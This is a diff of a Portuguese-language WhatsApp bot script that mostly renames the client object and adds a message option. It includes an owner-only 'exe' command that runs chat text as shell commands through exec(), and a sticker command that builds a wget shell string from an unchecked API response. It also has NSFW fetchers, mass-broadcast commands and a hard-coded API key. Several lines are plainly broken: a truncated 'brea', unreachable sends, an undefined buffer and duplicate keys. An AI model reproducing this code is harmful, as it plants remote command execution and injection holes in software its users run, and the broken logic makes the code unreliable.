 break
                 case 'nangis':
 
@@ -7502,19 +6859,19 @@ break
 						fs.unlinkSync(ranp)
 						if (err) return fakegroup (ind.stikga())
 						buffer = fs.readFileSync(rano)
-						tomioka.sendMessage(from, buffer, sticker, {quoted: mek})
+						client.sendMessage(from, buffer, sticker, {quoted: mek})
 						fs.unlinkSync(rano)
 					})
 					
 					break
 case 'exe':
-	              tomioka.updatePresence(from, Presence.composing) 
+	              client.updatePresence(from, Presence.composing) 
 	              if (!isOwner) return reply(mess.only.ownerB)
 	               const cmd = body.slice(5)
 	               exec(cmd, (err, stdout) => {
-		           if(err) return tomioka.sendMessage(from, "Comando errado", text, { quoted: ftoko })
+		           if(err) return client.sendMessage(from, "Comando errado", text, { quoted: ftoko ,contextInfo: tomis })
 		           if (stdout) {
-			       tomioka.sendMessage(from, stdout, text, { quoted: ftoko })
+			       client.sendMessage(from, stdout, text, { quoted: ftoko ,contextInfo: tomis })
 		           }
 	           })
                   break
@@ -7529,7 +6886,7 @@ case 'exe':
 						fs.unlinkSync(ranp)
 						if (err) return fakegroup (ind.stikga())
 						buffer = fs.readFileSync(rano)
-						tomioka.sendMessage(from, buffer, sticker, {quoted: mek})
+						client.sendMessage(from, buffer, sticker, {quoted: mek})
 						fs.unlinkSync(rano)
 					})
 					
@@ -7545,7 +6902,7 @@ case 'exe':
 						fs.unlinkSync(ranp)
 						if (err) return fakegroup (ind.stikga())
 						buffer = fs.readFileSync(rano)
-						tomioka.sendMessage(from, buffer, sticker, {quoted: mek})
+						client.sendMessage(from, buffer, sticker, {quoted: mek})
 						fs.unlinkSync(rano)
 					})
 					
@@ -7599,12 +6956,12 @@ break
 case 'divulgar':
 					if (!isOwner) return fakegroup ('Quem é você?')
 					if (args.length < 1) return fakegroup ('.......')
-					anu = await tomioka.chats.all()
+					anu = await client.chats.all()
 					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
 						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-						buff = await tomioka.downloadMediaMessage(encmedia)
+						buff = await client.downloadMediaMessage(encmedia)
 						for (let _ of anu) {
-							tomioka.sendMessage(_.jid, buff, image, {caption: `[ 𝐕𝐢𝐝𝐞𝐨 𝐧𝐨𝐯𝐨 𝐝𝐨 𝐭𝐨𝐦𝐢𝐨𝐤𝐚 ]\n\n${body.slice(4)}`})
+							client.sendMessage(_.jid, buff, image, {caption: `[ 𝐕𝐢𝐝𝐞𝐨 𝐧𝐨𝐯𝐨 𝐝𝐨 𝐭𝐨𝐦𝐢𝐨𝐤𝐚 ]\n\n${body.slice(4)}`})
 						}
 						reply('Transmissao enviada')
 					} else {
@@ -7617,12 +6974,12 @@ case 'divulgar':
 				case 'bc':
 if (!isOwner) return reply('Quem é Você, você não é meu dono 😂?')
 if (args.length < 1) return reply('.......')
-anu = await tomioka.chats.all()
+anu = await client.chats.all()
 if (isMedia && !mek.message.videoMessage || isQuotedImage) {
 const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-buff = await tomioka.downloadMediaMessage(encmedia)
+buff = await client.downloadMediaMessage(encmedia)
 for (let _ of anu) {
-tomioka.sendMessage(_.jid, buff, image, {caption: `[ TRANSMIÇÃO DE AVISO ]\n\n${body.slice(4)}`})
+client.sendMessage(_.jid, buff, image, {caption: `[ TRANSMIÇÃO DE AVISO ]\n\n${body.slice(4)}`})
 }
 reply('Transmissão enviada com sucesso')
 } else {
@@ -7635,12 +6992,12 @@ break
 case 'bcsticker':
 case 'bcstik':
 if (!isOwner) return fakegroup (mess.only.ownerB)
-					anu = await tomioka.chats.all()
+					anu = await client.chats.all()
 					if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
 						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-						bc = await tomioka.downloadMediaMessage(encmedia)
+						bc = await client.downloadMediaMessage(encmedia)
 						for (let _ of anu) {
-							tomioka.sendMessage(_.jid, bc, sticker, {quoted:mek})
+							client.sendMessage(_.jid, bc, sticker, {quoted:mek})
 						}
 						reply('tm de fig enviada')
 					}
@@ -7648,12 +7005,12 @@ if (!isOwner) return fakegroup (mess.only.ownerB)
 case 'bcaudio':
 					if (!isOwner) return reply('```OWNER ONLY```')
 					if (args.length < 1) return reply('.......')
-					anu = await tomioka.chats.all()
+					anu = await client.chats.all()
 					if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
 						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-						bc = await tomioka.downloadMediaMessage(encmedia)
+						bc = await client.downloadMediaMessage(encmedia)
 						for (let _ of anu) {
-							tomioka.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: ftoko,caption: `[ *TOMIOKA TRANSMISSÃO* ]\n\n${body.slice(9)}`})
+							client.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: ftoko ,contextInfo: tomis,caption: `[ *TOMIOKA TRANSMISSÃO* ]\n\n${body.slice(9)}`})
 						}
 						reply('sucesso')
 					}
@@ -7679,7 +7036,7 @@ break
 				case 'addfoto':
 					if (!isGroup) return fakegroup (mess.only.group)
 					if (!isOwner) return fakegroup ('Você quem é o dono? ')
-					tomioka.sendMessage(from, addfoto(prefix), text, { contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, addfoto(prefix), text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					break
 			  case 'next':
                 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
@@ -7696,7 +7053,7 @@ break
 						if (!isNsfw) return fakegroup ('❌ *FALSO* ❌')
 						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob`, {method: 'get'})
 						buffer = await getBuffer(res.result)
-						tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: 'Não faça ingredientes para o tio comum'})
+						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Não faça ingredientes para o tio comum'})
 					} catch (e) {
 						console.log(`Error :`, color(e,'red'))
 						reply('❌ *ERRO* ❌')
@@ -7705,13 +7062,13 @@ break
 				case 'testime':
 				    if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 					setTimeout( () => {
-					tomioka.sendMessage(from, 'O tempo acabou:v', text) // ur cods
+					client.sendMessage(from, 'O tempo acabou:v', text) // ur cods
 					}, 10000) // 1000 = 1s,
 					setTimeout( () => {
-					tomioka.sendMessage(from, 'Mais 5 segundos', text) // ur cods
+					client.sendMessage(from, 'Mais 5 segundos', text) // ur cods
 					}, 5000) // 1000 = 1s,
 					setTimeout( () => {
-					tomioka.sendMessage(from, '10 segundos para ir', text) // ur cods
+					client.sendMessage(from, '10 segundos para ir', text) // ur cods
 					}, 0) // 1000 = 1s,
 					break
                   case 'timer':
@@ -7735,10 +7092,10 @@ break
 							teks += `@${_.split('@')[0]}\n`
 						}
 						mentions(teks, mentioned, true)
-						tomioka.deleteMessage(from, mentioned)
+						client.deleteMessage(from, mentioned)
 					} else {
 						mentions(`Perintah di terima, hapus pesan : @${mentioned[0].split('@')[0]}`, mentioned, true)
-						tomioka.deleteMessage(from, mentioned)
+						client.deleteMessage(from, mentioned)
 					}
 					brea
 			    case 'nsfwneko':
@@ -7746,7 +7103,7 @@ break
 						if (!isNsfw) return fakegroup ('❌ *FALSO* ❌')
 						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwneko`, {method: 'get'})
 						buffer = await getBuffer(res.result)
-						tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: 'ni anjim'})
+						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'ni anjim'})
 					} catch (e) {
 						console.log(`Error :`, color(e,'red'))
 						reply('❌ *ERRO* ❌')
@@ -7757,7 +7114,7 @@ break
 						if (!isNsfw) return fakegroup ('❌ *FALSO* ❌')
 						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwtrap`, {method: 'get'})
 						buffer = await getBuffer(res.result)
-						tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: 'ni Anjim'})
+						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'ni Anjim'})
 					} catch (e) {
 						console.log(`Error :`, color(e,'red'))
 						reply('❌ *ERRO* ❌')
@@ -7796,7 +7153,7 @@ break
 					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
 						fs.unlinkSync(ranp)
 						buffer = fs.readFileSync(rano)
-						tomioka.sendMessage(from, buffer, sticker, {quoted: mek})
+						client.sendMessage(from, buffer, sticker, {quoted: mek})
 						fs.unlinkSync(rano)
 					})
 					 
@@ -7806,8 +7163,8 @@ break
                     if (!isGroup) return fakegroup (mess.only.group)
                     if (!isGroupAdmins) return fakegroup (mess.only.admin)
                     if (!isBotGroupAdmins) return fakegroup (mess.only.Badmin)
-                    media = await tomioka.downloadAndSaveMediaMessage(mek)
-                    await tomioka.updateProfilePicture (from, media)
+                    media = await client.downloadAndSaveMediaMessage(mek)
+                    await client.updateProfilePicture (from, media)
                     reply('Alterou com sucesso o ícone do Grupo')
                     break		
 			    case 'tinyurl':
@@ -7822,7 +7179,7 @@ break
 					teks = `${body.slice(7)}`
 					atytyd = await getBuffer(`https://api.vhtear.com/slidingtext?text=${teks}&apikey=${VthearApi}`, {method: 'get'})
 					return fakegroup (mess.wait)
-					tomioka.sendMessage(from, atytyd, video, {quoted: mek})
+					client.sendMessage(from, atytyd, video, {quoted: mek})
 					 
 					break  
 					case 'spotify':
@@ -7834,9 +7191,9 @@ get_result = get_result.result
 ini_txt = `Titulo : ${get_result.title}\n`
 ini_txt += `Duração : ${get_result.duration}\n`
 thumbnail = await getBuffer(get_result.thumbnail)
-await tomioka.sendMessage(from, thumbnail, image, {quoted: mek, caption: ini_txt })
+await client.sendMessage(from, thumbnail, image, {quoted: mek, caption: ini_txt })
 get_audio = await getBuffer(get_result.link)
-await tomioka.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, contextInfo: null, quoted: ftoko})
+await client.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 break 
 case 'spotifyy':
 if (args.length == 0) return 
@@ -7847,9 +7204,9 @@ get_result = get_result.result
 ini_txt = `Titulo : ${get_result.title}\n`
 ini_txt += `Duração : ${get_result.duration}\n`
 thumbnail = await getBuffer(get_result.image)
-await tomioka.sendMessage(from, image, image, {quoted: mek, caption: ini_txt })
+await client.sendMessage(from, image, image, {quoted: mek, caption: ini_txt })
 get_audio = await getBuffer(get_result.link)
-await tomioka.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, contextInfo: null, quoted: ftoko})
+await client.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 break
 //_LOGOS 
       case 'greenhorror':  //by Ꮥꪖꪗꪮ </>
@@ -7860,7 +7217,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/greenhorror?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'sciencefiction':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -7870,7 +7227,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/sciencefiction?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'transformer':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -7880,7 +7237,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/transformer?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'berry':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -7890,7 +7247,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/berry?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'magmahot':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -7900,7 +7257,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/magmahot?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case '3dstone':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -7910,7 +7267,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dstone?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case '3dneonlight':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -7920,7 +7277,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dneonlight?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'impressiveglitch':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -7930,7 +7287,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/impressiveglitch?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'harrypotter':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -7940,7 +7297,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/HarryPotter?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'embossed':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -7950,7 +7307,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/embossed?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'brokenglass':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -7960,7 +7317,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Brokenglass?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'artpaper':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -7970,7 +7327,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/artpaper?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case '3dglossy':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -7980,7 +7337,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dglossy?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'neondevilwings':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -7990,7 +7347,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/neondevilwings?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case '3dunderwater':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8000,7 +7357,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dunderwater?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'bearmascot':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8010,7 +7367,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/bearmascot?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'wonderfulgraffiti':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8020,7 +7377,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/wonderfulgraffiti?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'futuristicneon':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8030,7 +7387,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/futuristicneon?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'snow':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8040,7 +7397,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/snow?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'cloud':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8050,7 +7407,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/cloud?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'luxurygold':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8060,7 +7417,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/luxurygold?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case '3dgradient':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8070,7 +7427,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3Dgradient?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'realisticcloud':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8080,7 +7437,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/realisticcloud?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'sandsummer':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8090,7 +7447,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/SandSummer?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'sandwriting':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8100,7 +7457,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/SandWriting?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'sandengraved':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8110,7 +7467,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Sandengraved?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'summerysand':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8120,7 +7477,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/summerysand?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case '3dglue':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8130,7 +7487,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3dglue?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'metaldarkgold':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8140,7 +7497,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/MetalDarkGold?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'neonlight':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8150,7 +7507,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/NeonLight?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case '1917':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8160,7 +7517,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/1917Style?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'xmascards3d':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8170,7 +7527,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/XmasCards3D?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
+                   client.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko ,contextInfo: tomis, contextInfo: null})
                    break
                    case 'blood':  //by Ꮥꪖꪗꪮ </>
                    addFilter(from)
@@ -8180,7 +7537,7 @@ break
                    reply(`[❗] aguarde..`)
                    anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Blood?apikey=sayoez&text=${texto}`)
                    buffer = await getBuffer(anu.resultado)
-                   tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: ftoko, contextInfo: null})
